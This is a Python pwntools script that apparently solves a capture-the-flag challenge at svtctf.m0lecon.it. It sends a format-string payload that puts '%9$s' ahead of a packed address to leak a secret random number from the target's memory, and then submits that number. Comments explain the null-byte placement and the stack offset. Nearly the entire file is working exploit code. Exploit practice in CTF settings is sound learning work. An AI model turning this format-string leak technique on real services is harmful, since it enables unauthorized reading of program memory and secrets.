#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13472


def main():
    server = remote(HOST, PORT)
    #server.interactive()
    print(server.recvuntil(b'First, what is your name:\n', timeout=1))
    

    target_addr = 0x4040b0

    #payload = (target_addr).to_bytes(8, "little") + b'_%8$s'
    #In memory (little-endian), this looks like: \xb0\x40\x40\x00\x00\x00\x00\x00
    #If you put this address at the beginning of your payload, your payload starts with \xb0\x40\x40\x00. 
    # When printf tries to read your payload as a format string, it sees \xb0\x40\x40 and then hits the Null Byte (\x00). 
    # It thinks the string has ended, so it stops processing immediately. It never reaches your %y$s.

    #if the offset of my first input name is at 8, since %y$s____ takes 8 bytes, the new offset will be at 9 (+1, next arg in the stack, next 8 bytes) 
    payload = b'%9$s____' + (target_addr).to_bytes(8, "little")
    server.sendline(payload)

    print(server.recvuntil(b"Welcome:\n"))
    welcome = server.recvuntil(b'Now, guess the number:\n')
    rand_bytes = welcome.split(b'____')[0]
    
    print(rand_bytes)
    rand_number  = int.from_bytes(rand_bytes, byteorder='little')

    print("number(dec):" + str(rand_number))
    payload = str(rand_number).encode()

    #server.recvuntil(b"Now, guess the number:")
    server.sendline(payload)

    # read remainder of program output
    server.interactive()

if __name__ == '__main__':
    main()
